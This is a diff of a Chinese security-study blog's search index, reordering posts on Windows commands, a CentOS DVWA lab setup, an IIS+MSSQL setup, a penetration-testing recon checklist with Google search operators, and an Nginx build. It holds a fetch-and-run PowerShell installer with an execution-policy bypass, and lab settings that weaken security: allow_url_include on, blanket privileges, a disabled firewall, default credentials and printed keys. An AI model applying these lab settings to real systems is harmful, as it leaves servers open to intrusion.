-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" alt="image-20210809143026487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" class="lozad post-image"></p>
-<p>2、限制数据库权限（从管理员权限降权）</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" alt="image-20210809143259187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" class="lozad post-image"></p>
-<p>3、混合模式，设置密码，添加管理员</p>
-<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" alt="image-20210809143322279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" class="lozad post-image"></p>
-<p>4、后续全部确认即可</p>
-<p>5、新建数据库（testdb）</p>
-<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
-<p>7、替换网站原有数据库</p>
-<p>8、修改网站数据库配置文件</p>
-<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
-<p>注意：mssql账号为sa</p>
+<p>文件查找</p>
+<pre class="highlight"><span class="line">for /r c:/ %i in (*.png) do @echo %i		#搜索C盘下包含png后缀的文件</span><br><span class="line">for /r c:/ %i in (*user*) do @echo %i		#搜索C盘下包含user关键词的文件</span><br></pre>
+
+<p>choco安装</p>
+<p>检查</p>
+<pre class="highlight"><span class="line">Get-ExecutionPolicy</span><br></pre>
+
+<p>如果返回的是 <code>Restricted</code>，那么需要更改为<code>Bypass</code>或<code>AllSigned</code></p>
+<p>修改</p>
+<pre class="highlight"><span class="line">Set-ExecutionPolicy AllSigned</span><br><span class="line">或</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br></pre>
+
+<p>安装</p>
+<pre class="highlight"><span class="line">Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString(&#x27;https://chocolatey.org/install.ps1&#x27;))</span><br></pre>
+
+<p><strong>修改安装路径</strong></p>
+<p>打开注册表<code>regedit</code></p>
+<p>修改</p>
+<pre class="highlight"><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion</span><br></pre>
+
+<p>中的<code>ProgramFilesDir</code>和<code>ProgramFilesDir (x86)</code>的值为指定路径</p>
 ]]></content>
       <categories>
-        <category>环境搭建</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>IIS</tag>
+        <tag>随记</tag>
       </tags>
   </entry>
   <entry>
@@ -6668,132 +6692,103 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows随记</title>
-    <url>/article/Windows%E9%9A%8F%E8%AE%B0/</url>
-    <content><![CDATA[<table>
-<thead>
-<tr>
-<th align="left">命令</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">netstat -r</td>
-<td align="left">列出当前路由信息</td>
-</tr>
-<tr>
-<td align="left">dir</td>
-<td align="left">显示文件列表，同linux下ls</td>
-</tr>
-<tr>
-<td align="left">mkdir或mk</td>
-<td align="left">创建目录</td>
-</tr>
-<tr>
-<td align="left">rmdir或rd</td>
-<td align="left">删除目录</td>
-</tr>
-<tr>
-<td align="left">copy</td>
-<td align="left">复制，需要指定目录</td>
-</tr>
-<tr>
-<td align="left">del</td>
-<td align="left">删除</td>
-</tr>
-<tr>
-<td align="left">touch</td>
-<td align="left">创建文件</td>
-</tr>
-<tr>
-<td align="left">ren</td>
-<td align="left">重命名</td>
-</tr>
-<tr>
-<td align="left">type</td>
-<td align="left">查看文本文件</td>
-</tr>
-</tbody></table>
-<p>文件查找</p>
-<pre class="highlight"><span class="line">for /r c:/ %i in (*.png) do @echo %i		#搜索C盘下包含png后缀的文件</span><br><span class="line">for /r c:/ %i in (*user*) do @echo %i		#搜索C盘下包含user关键词的文件</span><br></pre>
+    <title>centos7搭建DVWA</title>
+    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
+    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
 
-<p>choco安装</p>
-<p>检查</p>
-<pre class="highlight"><span class="line">Get-ExecutionPolicy</span><br></pre>
+<p>启动apache并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
 
-<p>如果返回的是 <code>Restricted</code>，那么需要更改为<code>Bypass</code>或<code>AllSigned</code></p>
-<p>修改</p>
-<pre class="highlight"><span class="line">Set-ExecutionPolicy AllSigned</span><br><span class="line">或</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br></pre>
+<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
 
-<p>安装</p>
-<pre class="highlight"><span class="line">Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString(&#x27;https://chocolatey.org/install.ps1&#x27;))</span><br></pre>
+<p>启动Mysql并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
 
-<p><strong>修改安装路径</strong></p>
-<p>打开注册表<code>regedit</code></p>
-<p>修改</p>
-<pre class="highlight"><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion</span><br></pre>
+<p>配置Mysql数据库</p>
+<p>初始化mysql数据库（全部回车确认）</p>
+<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
 
-<p>中的<code>ProgramFilesDir</code>和<code>ProgramFilesDir (x86)</code>的值为指定路径</p>
+<p>设置mysql密码（非操作系统密码）</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
+
+<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<p>重启apache使php生效（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<p>配置</p>
+<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
+
+<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
+
+<p>解压并复制到/var/www/html目录</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
+
+<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
+
+<p>创建数据库</p>
+<p>登录（admin:password）</p>
 ]]></content>
       <categories>
-        <category>Windows</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>随记</tag>
+        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
-    <title>信息收集</title>
-    <url>/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<table>
+    <title>Windows搭建IIS+MSSql</title>
+    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/</url>
+    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
+<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
+<p>修改网站访问端口号</p>
+<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
 <thead>
 <tr>
-<th align="left">步骤</th>
-<th align="left">说明</th>
+<th align="left">报错类型</th>
+<th align="left">做法</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">前期交互</td>
-<td align="left">渗透人员+甲方客户-&gt;签授权合同  <br>规定攻击方式 ： <br>&#9;apt、钓鱼、近源、web、ddos、禁止延时盲注等  <br>规定渗透范围 ： <br>&#9;公司范围、目标范围  <br>规定渗透时间 ： <br>&#9;攻防演练：7天 长期渗透：2-3年  <br>规定法律法规相关 <br>规定信息泄露相关</td>
+<td align="left">403（无访问主程序）</td>
+<td align="left">修改默认文档，增加index.asp</td>
 </tr>
 <tr>
-<td align="left">信息搜集</td>
-<td align="left">大型企业 ：股权信息搜集 <br>中型企业 ：域名 <br>小型企业 ：IP  信息<br><br>收集方式 <br>主动收集：<br>与目标交互，会记录自己的操作信息 <br>被动收集：<br>不与目标交互，搜索引擎等工具  <br><br><strong>谷歌语法</strong> <br>site:找到与指定网站有联系的URL <br>inurl：将返回url中含有关键词的网页 <br>allinurl：与inurl类似，可以指定多个词 <br>intext：寻找正文中含有关键字的网页 <br>allintext：寻找正文中的多个关键字 <br>intitle：寻找标题中含有关键字的网页 <br>allintitle：寻找标题中的多个关键字 <br>filetype：指定访问的文件类型  <br><br>符号使用 <br>1、精确搜索： <br>给关键词加上双引号实现精确匹配双引号内的字符 <br><br>2、通配符： <br>谷歌的通配符是星号<code>&quot;*&quot;</code>，必须在精确搜索符双引号内部使用。用通配符代替关键词或短语中无法确定的字词 <br><br>3、点号匹配任意字符： <br>点号<code>&quot;.&quot;</code>匹配的是匹配某个字符，不是字、短语等内容。 <br><br>4、基本搜索符号约束： <br>加号<code>&quot;+&quot;</code>用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加<code>&quot;-&quot;</code>减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选。 <br><br>5、数字范围：<br>用两个点号<code>&quot;..&quot;</code>表示一个数字范围。一般应用于日期、货币、尺寸、重量、高度等范围的搜索如：手机2000..3000元，注意“3000”与“元”之间必须有空格<br><br>6、布尔逻辑：<br>或，符号`”</td>
+<td align="left">500（无法访问文件）</td>
+<td align="left">ASP-启用父路径</td>
 </tr>
 <tr>
-<td align="left">威胁建模</td>
-<td align="left">建立excle表格，进行信息整理，初步猜测可能存在的漏洞点 域名、IP、端口、中间件等</td>
+<td align="left">提示未启用32位程序池</td>
+<td align="left">应用程序池-网站-高级设置-32位应用程序池-True</td>
 </tr>
 <tr>
-<td align="left">渗透测试</td>
-<td align="left">top10漏洞、cms漏洞等 <br>注意： <br>挖src时，只允许到此截断，且webshell只允许输出提示语句（echo ‘ok’等）； <br>xss只允许使用console.log(/xss/)等 …</td>
-</tr>
-<tr>
-<td align="left">后渗透测试</td>
-<td align="left">有指向性的获取目标数据（狭义上：内网渗透）</td>
-</tr>
-<tr>
-<td align="left">报告截断</td>
-<td align="left">撰写报告</td>
+<td align="left">没有操作权限</td>
+<td align="left">修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制</td>
 </tr>
 </tbody></table>
-<p>其他：</p>
-<p>注册网站信息查询</p>
-<p><a href="https://www.reg007.com/">https://www.reg007.com/</a></p>
-<p>网站监测</p>
-<p><a href="https://anquan.baidu.com/product/secindex?industry=total">https://anquan.baidu.com/product/secindex?industry=total</a></p>
-<p>DNS信息</p>
-<p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
-<p>whoami信息</p>
-<p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
-<p>网站指纹信息</p>
-<p><a href="https://www.godeye.vip/">https://www.godeye.vip/</a></p>
+<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" alt="image-20210809143026487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" class="lozad post-image"></p>
+<p>2、限制数据库权限（从管理员权限降权）</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" alt="image-20210809143259187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" class="lozad post-image"></p>
+<p>3、混合模式，设置密码，添加管理员</p>
+<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" alt="image-20210809143322279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" class="lozad post-image"></p>
+<p>4、后续全部确认即可</p>
+<p>5、新建数据库（testdb）</p>
+<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
+<p>7、替换网站原有数据库</p>
+<p>8、修改网站数据库配置文件</p>
+<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
+<p>注意：mssql账号为sa</p>
 ]]></content>
       <categories>
-        <category>Web渗透</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>信息收集</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -6972,6 +6967,60 @@
       </tags>
   </entry>
   <entry>
+    <title>信息收集</title>
+    <url>/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<table>
+<thead>
+<tr>
+<th align="left">步骤</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">前期交互</td>
+<td align="left">渗透人员+甲方客户-&gt;签授权合同  <br>规定攻击方式 ： <br>&#9;apt、钓鱼、近源、web、ddos、禁止延时盲注等  <br>规定渗透范围 ： <br>&#9;公司范围、目标范围  <br>规定渗透时间 ： <br>&#9;攻防演练：7天 长期渗透：2-3年  <br>规定法律法规相关 <br>规定信息泄露相关</td>
+</tr>
+<tr>
+<td align="left">信息搜集</td>
+<td align="left">大型企业 ：股权信息搜集 <br>中型企业 ：域名 <br>小型企业 ：IP  信息<br><br>收集方式 <br>主动收集：<br>与目标交互，会记录自己的操作信息 <br>被动收集：<br>不与目标交互，搜索引擎等工具  <br><br><strong>谷歌语法</strong> <br>site:找到与指定网站有联系的URL <br>inurl：将返回url中含有关键词的网页 <br>allinurl：与inurl类似，可以指定多个词 <br>intext：寻找正文中含有关键字的网页 <br>allintext：寻找正文中的多个关键字 <br>intitle：寻找标题中含有关键字的网页 <br>allintitle：寻找标题中的多个关键字 <br>filetype：指定访问的文件类型  <br><br>符号使用 <br>1、精确搜索： <br>给关键词加上双引号实现精确匹配双引号内的字符 <br><br>2、通配符： <br>谷歌的通配符是星号<code>&quot;*&quot;</code>，必须在精确搜索符双引号内部使用。用通配符代替关键词或短语中无法确定的字词 <br><br>3、点号匹配任意字符： <br>点号<code>&quot;.&quot;</code>匹配的是匹配某个字符，不是字、短语等内容。 <br><br>4、基本搜索符号约束： <br>加号<code>&quot;+&quot;</code>用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加<code>&quot;-&quot;</code>减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选。 <br><br>5、数字范围：<br>用两个点号<code>&quot;..&quot;</code>表示一个数字范围。一般应用于日期、货币、尺寸、重量、高度等范围的搜索如：手机2000..3000元，注意“3000”与“元”之间必须有空格<br><br>6、布尔逻辑：<br>或，符号`”</td>
+</tr>
+<tr>
+<td align="left">威胁建模</td>
+<td align="left">建立excle表格，进行信息整理，初步猜测可能存在的漏洞点 域名、IP、端口、中间件等</td>
+</tr>
+<tr>
+<td align="left">渗透测试</td>
+<td align="left">top10漏洞、cms漏洞等 <br>注意： <br>挖src时，只允许到此截断，且webshell只允许输出提示语句（echo ‘ok’等）； <br>xss只允许使用console.log(/xss/)等 …</td>
+</tr>
+<tr>
+<td align="left">后渗透测试</td>
+<td align="left">有指向性的获取目标数据（狭义上：内网渗透）</td>
+</tr>
+<tr>
+<td align="left">报告截断</td>
+<td align="left">撰写报告</td>
+</tr>
+</tbody></table>
+<p>其他：</p>
+<p>注册网站信息查询</p>
+<p><a href="https://www.reg007.com/">https://www.reg007.com/</a></p>
+<p>网站监测</p>
+<p><a href="https://anquan.baidu.com/product/secindex?industry=total">https://anquan.baidu.com/product/secindex?industry=total</a></p>
+<p>DNS信息</p>
+<p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
+<p>whoami信息</p>
+<p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
+<p>网站指纹信息</p>
+<p><a href="https://www.godeye.vip/">https://www.godeye.vip/</a></p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>创建用户+提权</title>
     <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
@@ -7017,55 +7066,6 @@
       </categories>
       <tags>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7搭建DVWA</title>
-    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
-    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
-<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<p>启动apache并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
-
-<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-<p>启动Mysql并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
-
-<p>配置Mysql数据库</p>
-<p>初始化mysql数据库（全部回车确认）</p>
-<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
-
-<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
-<p>重启apache使php生效（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<p>配置</p>
-<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
-
-<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
-
-<p>解压并复制到/var/www/html目录</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
-
-<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
-
-<p>创建数据库</p>
-<p>登录（admin:password）</p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -7213,47 +7213,72 @@
       </tags>
   </entry>
   <entry>
-    <title>搭建LAMP环境</title>
-    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
-<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+    <title>搭建Nginx+直播推流平台</title>
+    <url>/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/</url>
+    <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>
 
-<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
+<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>
 
-<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>
 
-<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
+<p>注：需要下载配置环境</p>
+<p>如：</p>
+<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>
 
-<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
+<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>
 
-<p>设置mysql密码（非操作系统密码）</p>
-<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
+<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
+<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>
 
-<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+<p>至此，访问80端口可看到Nginx测试页</p>
+<p>下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
+<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>
 
